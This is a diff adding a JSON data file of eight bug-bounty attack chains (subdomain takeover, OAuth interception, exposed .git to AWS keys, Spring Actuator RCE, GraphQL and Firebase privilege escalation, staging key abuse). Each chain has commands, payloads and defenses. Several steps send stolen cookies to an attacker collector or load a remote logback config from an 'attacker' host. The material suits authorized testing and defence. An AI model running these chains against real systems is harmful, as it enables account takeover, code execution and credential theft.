@@ -1,0 +1,421 @@
+{
+  "domain": "Recon",
+  "domainLabel": "Recon → takeover",
+  "domainOrder": 1.5,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "Dead subdomain, live CSP: dangling-CNAME takeover all the way to session theft",
+      "level": "advanced",
+      "impact": "Execution of JS trusted by the main application, theft of the parent domain's session cookies and CSRF tokens, full session hijack. Typically pays out (more on an auth/SSO origin).",
+      "why": "The takeover by itself is not a bug; the dead subdomain is still listed in the main application's CSP script-src and shares the cookie scope Domain=.example.com, so claiming it turns a low-severity dangling-DNS finding into trusted code execution in production.",
+      "precondition": "The CNAME points to an unclaimed provider (*.github.io, *.herokudns.com, bucket.s3.amazonaws.com, *.azurewebsites.net, *.fastly.net), AND that host is present in the CSP or cookie scope of the main application.",
+      "tags": [
+        "subdomain-takeover",
+        "csp-bypass",
+        "cookie-theft",
+        "session"
+      ],
+      "realWorld": "HackerOne 'A Guide To Subdomain Takeovers 2.0'; MetaMask subdomain takeover (HackerOne #1717626).",
+      "defense": "Continuously diff dangling CNAMEs (dnsx -cname), remove decommissioned hosts from the CSP allowlist, use the __Host- cookie prefix.",
+      "steps": [
+        {
+          "title": "Enumerate subdomains and resolve CNAMEs",
+          "kind": "command",
+          "q": "subfinder",
+          "detail": "subfinder -d example.com -all | dnsx -cname -resp -silent"
+        },
+        {
+          "title": "Flag dangling and unclaimed targets",
+          "kind": "script",
+          "q": "Mass subdomain takeover (CNAME -> fingerprint)",
+          "detail": "subjack -w hosts.txt -t 100 -ssl -c fingerprints.json -v  +  nuclei -t http/takeovers/ -l hosts.txt"
+        },
+        {
+          "title": "Claim the resource at the provider and host your own JS",
+          "kind": "note",
+          "detail": "register the exact-named GitHub Pages repo / S3 bucket / Azure app, then host attacker x.js"
+        },
+        {
+          "title": "Check the dead host in the CSP header",
+          "kind": "note",
+          "detail": "curl -sI https://app.example.com | grep -i content-security-policy  then look for the dead subdomain in script-src"
+        },
+        {
+          "title": "Load the script from the trusted origin",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "<script src=\"https://dead.example.com/x.js\"></script>  passes CSP because the origin is allowlisted"
+        },
+        {
+          "title": "Steal the parent-domain cookies and the session",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "JS reads document.cookie or rides Domain=.example.com cookies and POSTs them to an attacker collector"
+        }
+      ]
+    },
+    {
+      "title": "Dirty dancing on a dangling host: subdomain takeover → ATO via OAuth",
+      "level": "advanced",
+      "impact": "Full account takeover by intercepting an OAuth code/access_token or SSO assertion; pre-account-takeover at scale. Typically pays out.",
+      "why": "A claimed dead subdomain that lands in the redirect_uri allowlist (or is reachable via a same-site redirect) catches the authorization code right in the flow and turns recon DNS dust into the keys to every linked account.",
+      "precondition": "The takeoverable subdomain is registered as a valid redirect_uri or reply URL of the target's OAuth client, OR the cookie is domain-scoped and a fixation cookie can be planted from the subdomain.",
+      "tags": [
+        "subdomain-takeover",
+        "oauth",
+        "account-takeover",
+        "redirect-uri"
+      ],
+      "realWorld": "Frans Rosen 'Dirty Dancing in petite places'; Zoom OAuth/cookie-tossing ATO ($15k, 2024); GitPod cookie tossing CVE-2024-21583.",
+      "defense": "Exact redirect_uri comparison (no wildcards), remove decommissioned hosts from the allowlist, PKCE + response_mode=form_post, __Host- cookies.",
+      "steps": [
+        {
+          "title": "Map subdomains and takeover candidates",
+          "kind": "script",
+          "q": "Mass subdomain takeover (CNAME -> fingerprint)",
+          "detail": "subfinder -d example.com | httpx -silent | nuclei -t http/takeovers/"
+        },
+        {
+          "title": "Gather the OAuth client config and the redirect allowlist",
+          "kind": "note",
+          "detail": "grep JS bundles for client_id, redirect_uri, response_type=token, /oauth/authorize"
+        },
+        {
+          "title": "Find a takeoverable host inside the allowlist",
+          "kind": "checklist",
+          "q": "recon",
+          "detail": "cross-reference dangling hosts against the allowed reply URLs"
+        },
+        {
+          "title": "Claim the dangling subdomain and set up an interceptor",
+          "kind": "note",
+          "detail": "register the unclaimed S3/Pages/Azure resource; host a page logging ?code=, fragment #access_token=, and postMessage data"
+        },
+        {
+          "title": "Craft an authorize URL pointing at the dead host",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "https://idp.example.com/authorize?client_id={CLIENT_ID}&redirect_uri=https://dead.example.com/cb&response_type=code&scope=..."
+        },
+        {
+          "title": "Replay the stolen code/token into the victim's session",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "exchange the stolen code at /oauth/token (Dirty Dancing response_type/response_mode confusion leaks fragment tokens cross-origin)"
+        }
+      ]
+    },
+    {
+      "title": "From /.git/HEAD to AWS root: source-code leak → cloud takeover",
+      "level": "intermediate",
+      "impact": "Read/write to S3/RDS, IAM enumeration and escalation, sometimes full takeover of the cloud account or internal network. Typically pays out according to blast radius.",
+      "why": "A misconfigured web root quietly serves the entire .git folder; you rebuild the proprietary source offline and pull live AWS keys out of history that were deleted months ago but never rotated.",
+      "precondition": "https://host/.git/HEAD returns 'ref: refs/heads/...' (no directory listing needed, objects are pulled directly).",
+      "tags": [
+        "git-exposure",
+        "source-code",
+        "aws",
+        "cloud-takeover",
+        "secrets"
+      ],
+      "realWorld": "'From .git directory to AWS EC2 network takeover' (alsolaiman); Appsecco 'Finding Treasures in Github and Exploiting AWS'.",
+      "defense": "Block .git at the web server/CDN, rotate keys on every commit (git-secrets pre-commit), least-privilege IAM, alert on sts:GetCallerIdentity from new ASNs.",
+      "steps": [
+        {
+          "title": "Scan for an exposed VCS directory",
+          "kind": "command",
+          "q": "nuclei",
+          "detail": "nuclei -t http/exposures/configs/git-config.yaml -l live.txt  (or curl -s https://host/.git/HEAD)"
+        },
+        {
+          "title": "Dump and rebuild the repository offline",
+          "kind": "note",
+          "detail": "git-dumper https://host/.git/ ./loot  (or GitTools gitdumper.sh + extractor.sh)"
+        },
+        {
+          "title": "Scan the entire history for secrets",
+          "kind": "script",
+          "q": "CI / repo secrets grep (AKIA / AIza / xox / ghp_ / .tfstate)",
+          "detail": "trufflehog filesystem ./loot --only-verified  and  gitleaks detect -s ./loot -v"
+        },
+        {
+          "title": "Pull keys from deleted blobs and old commits",
+          "kind": "note",
+          "detail": "git rev-list --all | xargs -I{} git grep -I AKIA {}"
+        },
+        {
+          "title": "Safely validate the cloud key",
+          "kind": "note",
+          "detail": "aws sts get-caller-identity  then  enumerate-iam --access-key ... --secret-key ..."
+        },
+        {
+          "title": "Enumerate resources and prove impact",
+          "kind": "checklist",
+          "q": "cloud",
+          "detail": "aws s3 ls; aws iam list-attached-user-policies; prove read on one private object only; check privesc paths (iam:PassRole, CreatePolicyVersion), no bulk exfil"
+        }
+      ]
+    },
+    {
+      "title": "Heapdump theft: Spring Actuator info leak → RCE",
+      "level": "advanced",
+      "impact": "Theft of live secrets (DB credentials, cloud keys, signing keys) and often full RCE. Typically pays out (at RCE level).",
+      "why": "The /actuator/heapdump info leak is in fact a full JVM memory snapshot that you mine offline for live credentials, while a writable /actuator/env chains into code execution without any memory corruption.",
+      "precondition": "An Actuator path responds (/actuator, /actuator/health or legacy /heapdump, /env, /mappings); the fingerprint is JSON with _links or {\"status\":\"UP\"}.",
+      "tags": [
+        "spring-actuator",
+        "heapdump",
+        "rce",
+        "secrets",
+        "management-interface"
+      ],
+      "realWorld": "Wiz 'Exploring Spring Boot Actuator Misconfigurations'; Maass 'Stealing Secrets Using Spring Actuators'; HackTricks Spring Actuators.",
+      "defense": "management.endpoints.web.exposure.include=health,info; move Actuator to a separate non-public port behind auth; strip env/heapdump/restart in production.",
+      "steps": [
+        {
+          "title": "Find Actuator endpoints",
+          "kind": "command",
+          "q": "nuclei",
+          "detail": "nuclei -t http/misconfiguration/springboot/ -u https://host  (or fuzz /actuator/{env,heapdump,mappings,gateway/routes})"
+        },
+        {
+          "title": "Pull the heap dump to disk",
+          "kind": "note",
+          "detail": "curl -s https://host/actuator/heapdump -o heap.hprof  (often hundreds of MB)"
+        },
+        {
+          "title": "Mine the dump for live secrets",
+          "kind": "note",
+          "detail": "Eclipse MAT / VisualVM OQL, or  strings heap.hprof | grep -iE 'password|secret|AKIA|x-api-key|jdbc:'"
+        },
+        {
+          "title": "RCE A: env/Eureka injection in Spring Cloud",
+          "kind": "payload",
+          "q": "Insecure Deserialization",
+          "detail": "POST eureka.client.serviceUrl.defaultZone XStream gadget to /actuator/env then hit /actuator/refresh"
+        },
+        {
+          "title": "RCE B: swap logging.config for your own logback",
+          "kind": "payload",
+          "q": "Insecure Management Interface",
+          "detail": "POST logging.config=http://attacker/logback.xml to /actuator/env then /actuator/restart"
+        },
+        {
+          "title": "RCE C: H2 CREATE ALIAS via an accessible datasource",
+          "kind": "payload",
+          "q": "Insecure Management Interface",
+          "detail": "set spring.datasource.url to an H2 mem DB and inject a Java stored procedure via CREATE ALIAS"
+        }
+      ]
+    },
+    {
+      "title": "The schema says admin: GraphQL introspection → privilege escalation",
+      "level": "intermediate",
+      "impact": "Self-promotion to admin, access to other tenants' data, account takeover via undocumented mutations. Typically pays out.",
+      "why": "Introspection hands over the full undocumented schema (internal setRole/impersonate mutations that the UI never calls), and the absence of authz at the resolver level lets you invoke them directly.",
+      "precondition": "A GraphQL endpoint (/graphql, /api/graphql, /v1/graphql, Hasura/Apollo) responds to introspection, or 'did you mean' field suggestions are enabled even with introspection turned off.",
+      "tags": [
+        "graphql",
+        "introspection",
+        "privilege-escalation",
+        "bola"
+      ],
+      "realWorld": "HackerOne 'How a GraphQL Bug Resulted in Authentication Bypass'; a finding at the HackerOne Ambassador World Cup 2023; PortSwigger GraphQL labs.",
+      "defense": "Disable introspection and field suggestions in production, enforce authz in every resolver (not at the gateway), limit query depth and batching, persisted queries.",
+      "steps": [
+        {
+          "title": "Find the GraphQL endpoint",
+          "kind": "command",
+          "q": "nuclei",
+          "detail": "nuclei -t http/exposures/graphql-detect.yaml  (or probe {__typename})"
+        },
+        {
+          "title": "Dump the full schema",
+          "kind": "note",
+          "detail": "clairvoyance / graphql-cop / Burp InQL; if introspection is off, brute-force fields via suggestions"
+        },
+        {
+          "title": "Map mutations against authz gaps",
+          "kind": "checklist",
+          "q": "graphql",
+          "detail": "flag updateUserRole, setIsAdmin, createInvite, impersonate, resetPassword(userId)"
+        },
+        {
+          "title": "Test object-level authz (BOLA)",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "query{ user(id:\"VICTIM\"){ email tokens } }  with your own session"
+        },
+        {
+          "title": "Invoke the privileged mutation directly",
+          "kind": "payload",
+          "q": "GraphQL Injection",
+          "detail": "mutation{ updateUserRole(userId:\"<me>\", role:\"ADMIN\"){ ok } }"
+        },
+        {
+          "title": "Pivot to ATO via the change-email mutation",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "mutation{ changeEmail(userId:\"VICTIM\", email:\"attacker@x\") }"
+        }
+      ]
+    },
+    {
+      "title": "The bundle is a map: JS mining → mass IDOR",
+      "level": "intermediate",
+      "impact": "Mass extraction of PII and other users' records via undocumented endpoints, sometimes access to the admin API. Typically pays out for the mass IDOR.",
+      "why": "Sourcemaps and webpack chunks reveal internal API hosts, role flags, and old hardcoded keys that were removed from the current code but never rotated, so you hit endpoints the application advertises nowhere.",
+      "precondition": "Reachable JS and sourcemap assets (main.hash.js, *.js.map), which holds for almost any SPA.",
+      "tags": [
+        "js-recon",
+        "sourcemap",
+        "idor",
+        "bola",
+        "api-key-leak"
+      ],
+      "realWorld": "'Hunting API Keys in JavaScript Files' (Medusa); the jsmon JS-recon guide; numerous sourcemap-IDOR writeups.",
+      "defense": "Strip sourcemaps from production, rotate any key that ever shipped to the client, enforce object-level authz on the server, treat any client-side key as public.",
+      "steps": [
+        {
+          "title": "Collect historical and live JS URLs",
+          "kind": "command",
+          "q": "katana",
+          "detail": "gau example.com | grep '\\.js'  and  katana -u https://app.example.com -jc -d 3 -o js.txt"
+        },
+        {
+          "title": "De-minify via exposed sourcemaps",
+          "kind": "note",
+          "detail": "fetch *.js.map then  npx source-map-explorer / unpacker to restore names and paths"
+        },
+        {
+          "title": "Extract endpoints and secrets",
+          "kind": "script",
+          "q": "JS mass scan (fetch -> endpoints + secrets -> dedup)",
+          "detail": "linkfinder -i main.js -o cli  and  trufflehog filesystem ./js --only-verified / SecretFinder"
+        },
+        {
+          "title": "Diff for endpoints the UI never calls",
+          "kind": "checklist",
+          "q": "recon",
+          "detail": "flag /api/internal/*, /admin/*, isAdmin, feature-flag and debug routes"
+        },
+        {
+          "title": "Test object endpoints for missing authz",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "iterate GET /api/v2/users/{id}/invoices swapping {id} with your own token (BOLA)"
+        },
+        {
+          "title": "Reach private data with a stale key",
+          "kind": "payload",
+          "q": "API Key Leaks",
+          "detail": "curl -H \"x-api-key: <leaked>\" https://api.example.com/internal/export"
+        }
+      ]
+    },
+    {
+      "title": "Config in plain sight: open Firebase → database takeover",
+      "level": "newbie",
+      "impact": "Unauthenticated read of all user data and, when the rules = true, write/edit of records leading to account takeover, privilege flags, and data corruption. Typically pays out (critical when flipping the isAdmin/role field).",
+      "why": "A Firebase config in plain sight in the JS/APK is not a bug; the bug is the lazy rules '.read'/'.write': true, and the /.json trick turns the config leak into unauthenticated read AND write of the production database.",
+      "precondition": "The Firebase projectId/databaseURL is visible in the web bundle or APK (apiKey, project.firebaseio.com, project.firebasestorage.app).",
+      "tags": [
+        "firebase",
+        "misconfiguration",
+        "database-takeover",
+        "account-takeover"
+      ],
+      "realWorld": "Zego 'Firebase Database Takeover' (HackerOne #1065134); securitybreached 'Exploiting Insecure Firebase Database'; tauh33dkhan Insecure-Firebase repo.",
+      "defense": "Gate .read/.write behind auth != null plus ownership checks, restrict the Web API key, audit Storage rules, do not rely on the config being secret.",
+      "steps": [
+        {
+          "title": "Pull the Firebase config from the JS/APK",
+          "kind": "note",
+          "detail": "grep bundle for firebaseio.com / apiKey; for apps  apktool d app.apk  then grep google-services.json"
+        },
+        {
+          "title": "Test RTDB read with the REST trick",
+          "kind": "note",
+          "detail": "curl 'https://project.firebaseio.com/.json'  (200 + JSON = world-readable)"
+        },
+        {
+          "title": "Test write permissions",
+          "kind": "note",
+          "detail": "curl -X PUT -d '{\"pwn\":true}' 'https://project.firebaseio.com/test.json'"
+        },
+        {
+          "title": "Self-provision an account via Identity Toolkit",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "signupNewUser via identitytoolkit.googleapis.com?key=<apiKey>  when email/password auth is open"
+        },
+        {
+          "title": "Flip a privilege field on a record",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "PATCH /users/<uid>.json setting \"role\":\"admin\" / \"isPremium\":true"
+        },
+        {
+          "title": "Read a sensitive collection for proof",
+          "kind": "checklist",
+          "q": "api-key-leaks",
+          "detail": "data-exposure proof gate: count records, screenshot one; report the exact insecure rule + least-privilege fix"
+        }
+      ]
+    },
+    {
+      "title": "Door into staging: forgotten host + Swagger → shared-key abuse",
+      "level": "intermediate",
+      "impact": "Access to prod data through a less-protected twin, plus abuse of a shared SendGrid/Stripe/Twilio key (phishing from a trusted sender, fraudulent charges, PII exfiltration). Typically pays out when the keys are shared with prod.",
+      "why": "This is a multi-artifact finale: a forgotten staging./dev. host with debug enabled and weak authorization serves API docs that hand over a real integration key shared with prod, and three low findings add up to a single critical.",
+      "precondition": "A non-prod host resolves (staging., dev., uat., preprod., qa. or *.internal., surfaced in a certificate SAN or CT logs) and serves docs or debug.",
+      "tags": [
+        "staging",
+        "swagger",
+        "api-key-leak",
+        "credential-reuse",
+        "secrets"
+      ],
+      "realWorld": "keyhacks (streaak); Cybernews 'MailChimp, Mailgun, Sendgrid API leak'; common staging/Swagger BOLA writeups.",
+      "defense": "Keep non-prod off the public internet (IP allowlist/VPN), unique keys per environment, disable Swagger/Actuator/DEBUG anywhere internet-reachable, monitor third-party key usage by source IP.",
+      "steps": [
+        {
+          "title": "Pull non-prod hosts from CT logs and permutations",
+          "kind": "command",
+          "q": "dnsx",
+          "detail": "crt.sh?q=%25.example.com piped to dnsx, plus dnsgen/gotator permutations resolved with puredns"
+        },
+        {
+          "title": "Probe for weak authorization and debug toggles",
+          "kind": "checklist",
+          "q": "recon",
+          "detail": "staging-hardening gate: default creds, no WAF, ?debug=true, Django DEBUG=True traceback, phpinfo()"
+        },
+        {
+          "title": "Find API docs and collections",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://staging.example.com/FUZZ -w api-docs.txt  for /swagger.json, /openapi.json, /v2/api-docs, *.postman_collection.json, /actuator"
+        },
+        {
+          "title": "Import the spec and auto-build requests",
+          "kind": "script",
+          "q": "OpenAPI / Swagger mass tester (path x method)",
+          "detail": "load openapi.json into Burp/Postman; enumerate every operation incl. undocumented admin ones"
+        },
+        {
+          "title": "Harvest secrets from the staging surface",
+          "kind": "note",
+          "detail": "pull SENDGRID_API_KEY / STRIPE_SECRET / TWILIO_AUTH from /actuator/env, .env, or traceback locals"
+        },
+        {
+          "title": "Validate the key and check whether it's shared with prod",
+          "kind": "payload",
+          "q": "API Key Leaks",
+          "detail": "keyhacks: curl -H 'Authorization: Bearer SG.<key>' https://api.sendgrid.com/v3/scopes ; curl https://api.stripe.com/v1/charges -u sk_live_<key>:  then constrained PoC abuse, no spam; pivot reused creds to prod"
+        }
+      ]
+    }
+  ]
+}
